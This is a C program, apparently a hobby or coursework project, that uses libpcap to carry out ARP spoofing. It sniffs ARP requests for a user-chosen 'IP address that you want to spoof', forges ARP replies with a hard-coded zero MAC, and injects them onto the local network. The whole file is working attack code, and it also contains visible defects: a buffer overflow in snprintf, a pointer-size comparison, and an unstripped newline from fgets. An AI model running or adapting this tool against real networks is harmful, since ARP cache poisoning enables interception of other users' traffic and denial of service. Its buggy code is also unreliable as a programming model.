#include <stdio.h>
#include <time.h>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include<time.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<string.h>
#include<sys/select.h>
#include<pthread.h>
#include<signal.h>
#include<stdlib.h>
#include<fcntl.h>
#include<sys/shm.h>
#include<unistd.h>
#include<sys/un.h>
#include<netinet/ip.h>
#include<arpa/inet.h>
#include<errno.h>
#include<netinet/if_ether.h>
#include<net/ethernet.h>
#include<netinet/ether.h>
#include<netinet/udp.h>

#define ETHERNET_HEADER_LENGTH 14 

char ip_addr[INET_ADDRSTRLEN];
char my_ip_addr[INET_ADDRSTRLEN];

pcap_t *handle;

struct arpheader{

    uint16_t htype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
    uint16_t oper;
    uint8_t sha[6];
    uint8_t spa[4];
    uint8_t tha[6];
    uint8_t tpa[4];

};

void print_arpheader(struct arpheader* arph){

    printf("------------------- ARP Header ---------------------\n");

    printf("Hardware Type - %d\n", ntohs(arph->htype));
    printf("Protocol Type - %d\n", ntohs(arph->ptype));
    printf("Hardware Address Length - %d\n", arph->hlen);
    printf("Protocol Address Length - %d\n", arph->plen);
    printf("Operation - %d\n", ntohs(arph->oper));
    char macStr[18];
    snprintf(macStr, 40, "%02x:%02x:%02x:%02x:%02x:%02x",
             arph->sha[0], arph->sha[1], arph->sha[2], arph->sha[3], arph->sha[4], arph->sha[5]);
    printf("Sender Hardware Address - %s\n", macStr);

    printf ("Sender Protocol Address - %u.%u.%u.%u\n",
    arph->spa[0], arph->spa[1], arph->spa[2], arph->spa[3]);

    memset(macStr, 0, 18);
    snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
             arph->tha[0], arph->tha[1], arph->tha[2], arph->tha[3], arph->tha[4], arph->tha[5]);
    printf("Target Hardware Address - %s\n", macStr);

    printf ("Target Protocol Address - %u.%u.%u.%u\n",
    arph->tpa[0], arph->tpa[1], arph->tpa[2], arph->tpa[3]);

     printf("----------------------------------------------\n");

}


void my_packet_handler(
    u_char *args,
    const struct pcap_pkthdr *header,
    const u_char *packet
);

int main(int argc, char *argv[]) {
    char *device;
    char error_buffer[PCAP_ERRBUF_SIZE];

    int timeout_limit = 1000; /* In milliseconds */

    device = pcap_lookupdev(error_buffer);
    if (device == NULL) {
        printf("Error finding device: %s\n", error_buffer);
        return 1;
    }

    char ip[13];
    char subnet_mask[13];
    bpf_u_int32 ip_raw; /* IP address as integer */
    bpf_u_int32 subnet_mask_raw; /* Subnet mask as integer */
    int lookup_return_code;

    struct in_addr address; /* Used for both ip & subnet */

    /* Get device info */
    lookup_return_code = pcap_lookupnet(
        device,
        &ip_raw,
        &subnet_mask_raw,
        error_buffer
    );
    if (lookup_return_code == -1) {
        printf("%s\n", error_buffer);
        return 1;
    }

    /*
    If you call inet_ntoa() more than once
    you will overwrite the buffer. If we only stored
    the pointer to the string returned by inet_ntoa(),
    and then we call it again later for the subnet mask,
    our first pointer (ip address) will actually have
    the contents of the subnet mask. That is why we are
    using a string copy to grab the contents while it is fresh.
    The pointer returned by inet_ntoa() is always the same.

    This is from the man:
    The inet_ntoa() function converts the Internet host address in,
    given in network byte order, to a string in IPv4 dotted-decimal
    notation. The string is returned in a statically allocated
    buffer, which subsequent calls will overwrite. 
    */

    /* Get ip in human readable form */
    address.s_addr = ip_raw;
    strcpy(ip, inet_ntoa(address));
    if (ip == NULL) {
        perror("inet_ntoa"); /* print error */
        return 1;
    }
    
    /* Get subnet mask in human readable form */
    address.s_addr = subnet_mask_raw;
    strcpy(subnet_mask, inet_ntoa(address));
    if (subnet_mask == NULL) {
        perror("inet_ntoa");
        return 1;
    }

    printf("Device: %s\n", device);
    printf("Network address: %s\n", ip);
    printf("Subnet mask: %s\n", subnet_mask);
    static char errbuf[PCAP_ERRBUF_SIZE];

    pcap_if_t *alldevs;
    int status = pcap_findalldevs(&alldevs, errbuf);
    if(status != 0) {
        printf("%s\n", errbuf);
        return 1;
    }

    for(pcap_if_t *d=alldevs; d!=NULL; d=d->next) {
        if(strncmp(d->name,  device, sizeof(device)) == 0){
            for(pcap_addr_t *a=d->addresses; a!=NULL; a=a->next) {
                if(a->addr->sa_family == AF_INET){
                    printf("IP address: %s\n", inet_ntoa(((struct sockaddr_in*)a->addr)->sin_addr));
                    sprintf(my_ip_addr,"%s", inet_ntoa(((struct sockaddr_in*)a->addr)->sin_addr));
                }else if(a->addr->sa_family == ARPHRD_ETHER){
                    // printf("MAC Address\n");

                }
            }  
        }
    }


    printf("Enter the IP address that you want to spoof - ");
    fgets(ip_addr, INET_ADDRSTRLEN, stdin);

    printf("IP Address - %s\n", ip_addr);

    /* Open device for live capture */
    handle = pcap_open_live(
            device,
            BUFSIZ,
            0,
            timeout_limit,
            error_buffer
        );
    if (handle == NULL) {
         fprintf(stderr, "Could not open device %s: %s\n", device, error_buffer);
         return 2;
     }
     
    pcap_loop(handle, 0, my_packet_handler, NULL);

    return 0;
}

/* This function can be used as a callback for pcap_loop() */
void my_packet_handler(
    u_char *args,
    const struct pcap_pkthdr* header,
    const u_char* packet
) {
    struct ether_header *eth_header;
    /* The packet is larger than the ether_header struct,
       but we just want to look at the first part of the packet
       that contains the header. We force the compiler
       to treat the pointer to the packet as just a pointer
       to the ether_header. The data payload of the packet comes
       after the headers. Different packet types have different header
       lengths though, but the ethernet header is always the same (14 bytes) */
    eth_header = (struct ether_header *) packet;
    


    if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) {

        // printf("ARP\n");
        struct arpheader* arph = (struct arpheader *)(packet + ETHERNET_HEADER_LENGTH);
        // print_arpheader(arph);  
        char received_ip[INET_ADDRSTRLEN];
        sprintf (received_ip, "%u.%u.%u.%u", arph->tpa[0], arph->tpa[1], arph->tpa[2], arph->tpa[3]);

        // if((strncmp(ip_addr, received_ip, sizeof(ip_addr)) == 0)){ // if arph->tpa and IP address is same, 
                         // add my mac address to the field and set operation to 2 and inject it
        // printf("Victim IP Address - %s\n", ip_addr);
        // printf("Target IP Address - %s\n", received_ip);
        // printf("%d %d \n", strlen(ip_addr), strlen(received_ip));
        // printf("strncmp - %d\n", strncmp(ip_addr, received_ip, 13));
        // printf("%d\n", ntohs(arph->oper));
        if((strncmp(ip_addr, received_ip, 15) == 0) && (ntohs(arph->oper) == 1)){
            printf("RECEIVED HEADER\n");
            print_arpheader(arph);

            uint8_t sha[6];
            uint8_t spa[4];
            uint8_t tha[6];
            uint8_t tpa[4];
            uint8_t hardware_address[6];
            hardware_address[0] = 0x00;
            hardware_address[1] = 0x00;
            hardware_address[2] = 0x00;
            hardware_address[3] = 0x00;
            hardware_address[4] = 0x00;
            hardware_address[5] = 0x00;

            for(int i = 0; i < 6; i++){
                sha[i] = arph->tha[i];
                tha[i] = arph->sha[i];
                arph->tha[i] = tha[i];
                arph->sha[i] = hardware_address[i]; //
            }

            struct in_addr in;
            inet_aton(my_ip_addr, &in);
            uint8_t * ip_address = (uint8_t *)&in.s_addr;
            for(int i = 0; i < 4; i++){
                spa[i] = arph->tpa[i];
                tpa[i] = arph->spa[i];
                arph->tpa[i] = tpa[i];
                arph->spa[i] = spa[i];
            }


            arph->oper = htons(2);
            printf("MODIFIED HEADER\n");
            print_arpheader(arph);

            pcap_sendpacket(handle, packet, (int)42); 
            /*
            if(n == -1){
                printf("%s\n", pcap_geterr(handle));
            }

            printf("n - %d\n", n);
            */
        }
    }
}

